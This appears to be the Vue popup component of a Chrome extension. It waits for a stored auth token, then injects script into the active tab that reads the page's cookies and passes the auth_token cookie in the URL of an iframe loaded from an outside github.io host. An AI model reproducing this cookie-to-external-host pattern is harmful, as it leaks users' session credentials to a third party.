<style>
@import url('https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta1/dist/css/bootstrap.min.css');
@import url('https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css');

html {
  height: 800px;
  width: 600px;
}
</style>

<script>
export default {
  name: 'App',
  data () {
    return {
      token: null
    }
  },
  mounted () {
    const intervalAuthTokenFind = setInterval(() => {
      chrome.storage.local.get('auth_token', (data) => {
        if (data.auth_token) {
          clearInterval(intervalAuthTokenFind)
          chrome.tabs.query({
            active: true,
            currentWindow: true
          }, (tabs) => {
            chrome.scripting.executeScript(
              {
                target: { tabId: tabs[0].id },
                function: async () => {
                  const cookies = {}
                  document.cookie.split(';').forEach((cookie) => {
                    const [key, value] = cookie.split('=')
                    // Check for undefined key and empty value
                    if (key && value.trim()) {
                      cookies[key.trim()] = value.trim()
                    }
                  })
                  const iframe = document.createElement('iframe')
                  iframe.id = 'myIframe'
                  iframe.src = 'https://fcyazilim.github.io/popup.html?apiKey=' + cookies.auth_token
                  iframe.style.width = '100%' // isteğe bağlı genişlik ayarı
                  iframe.style.height = '100vh' // isteğe bağlı yükseklik ayarı
                  document.body.insertBefore(iframe, document.body.firstChild)
                  iframe.setAttribute('data-jwt', cookies.auth_token)
                  let loadCount = 0
                  document.getElementById('myIframe').onload = function () {
                    loadCount++
                    if (loadCount === 2) {
                      location.reload()
                    }
                  }
                }
              }
            )
          })
          window.close()
        }
      })
    }, 2000)
  }
}
</script>
